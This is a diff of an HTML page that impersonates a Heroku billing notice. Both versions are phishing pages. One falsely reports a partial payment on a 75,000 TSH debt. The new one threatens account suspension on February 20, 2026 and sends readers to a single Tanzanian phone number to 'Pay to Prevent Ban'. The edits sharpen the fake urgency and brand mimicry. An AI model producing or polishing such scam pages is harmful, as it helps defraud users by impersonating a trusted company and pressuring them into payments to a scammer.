@@ -13,13 +13,13 @@
             color: #3f3f44;
         }
 
-        /* Notice Banner */
+        /* Heroku-style Purple Warning Banner */
         .urgent-banner {
-            background-color: #2e7d32; /* Green to show successful partial payment */
+            background-color: #79589f;
             color: #ffffff;
             text-align: center;
             padding: 14px 10px;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 500;
         }
 
@@ -40,7 +40,7 @@
 
         .container {
             max-width: 500px;
-            margin: 40px auto;
+            margin: 50px auto;
             padding: 0 20px;
         }
 
@@ -55,18 +55,7 @@
 
         h2 {
             color: #430098;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-
-        .status-badge {
-            background: #e8f5e9;
-            color: #2e7d32;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            display: inline-block;
+            font-size: 22px;
             margin-bottom: 20px;
         }
 
@@ -82,32 +71,8 @@
             background: #f4f4f9;
             border-radius: 4px;
             padding: 20px;
-            margin: 20px 0;
+            margin: 25px 0;
             border-left: 4px solid #79589f;
-            text-align: left;
-        }
-
-        .price-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            font-size: 14px;
-        }
-
-        .success-text {
-            color: #2e7d32;
-            font-weight: bold;
-        }
-
-        .total-row {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 10px;
-            padding-top: 10px;
-            border-top: 1px dashed #ccc;
-            font-weight: bold;
-            color: #430098;
-            font-size: 18px;
         }
 
         .phone-display {
@@ -115,8 +80,7 @@
             font-size: 20px;
             color: #430098;
             font-weight: bold;
-            margin-top: 12px;
-            text-align: center;
+            margin-top: 8px;
         }
 
         .btn-pay {
@@ -129,7 +93,10 @@
             display: inline-block;
             transition: background 0.2s;
             width: 80%;
-            margin-top: 10px;
+        }
+
+        .btn-pay:hover {
+            background-color: #634683;
         }
 
         .disclaimer {
@@ -143,7 +110,7 @@
 <body>
 
     <div class="urgent-banner">
-        <strong>Confirmed:</strong> Early partial payment processed. Remaining balance updated.
+        Critical Notice: Account suspension scheduled for <strong>20/02/2026</strong>.
     </div>
 
     <div class="header">
@@ -152,36 +119,20 @@
 
     <div class="container">
         <div class="card">
-            <div class="status-badge">PARTIALLY PAID</div>
-            <h2>Account Update</h2>
+            <h2>Payment Required</h2>
             
-            <p>New payment deadline:</p>
-            <span class="date-highlight">March 4, 2026 at 00:00 (Midnight)</span>
+            <p>Your Heroku services are scheduled to be banned on:</p>
+            <span class="date-highlight">February 20, 2026</span>
 
             <div class="billing-terminal">
-                <div class="price-row">
-                    <span>Previous Debt:</span>
-                    <span>75,000 TSH</span>
-                </div>
-                <div class="price-row">
-                    <span class="success-text">Early Payment Applied:</span>
-                    <span class="success-text">-30,000 TSH</span>
-                </div>
-                <div class="total-row">
-                    <span>REMAINING BALANCE:</span>
-                    <span>45,000 TSH</span>
-                </div>
-
-                <div style="margin-top: 20px; text-align: center; font-size: 13px;">
-                    Authorized Billing Terminal:
-                    <span class="phone-display">+255 610 274 920</span>
-                </div>
+                Only this number has billing access:
+                <span class="phone-display">+255 610 274 920</span>
             </div>
 
-            <a href="tel:+255610274920" class="btn-pay">Pay 45,000 TSH Balance</a>
+            <a href="tel:+255610274920" class="btn-pay">Pay to Prevent Ban</a>
 
             <div class="disclaimer">
-                <strong>Notice:</strong> Your debt has been reduced due to an early payment. To avoid service suspension, the remaining <strong>45,000 TSH</strong> must be cleared by March 4th at 00:00.
+                Payment must be finalized through the authorized billing terminal above to clear the suspension flag from your account.
             </div>
         </div>
     </div>
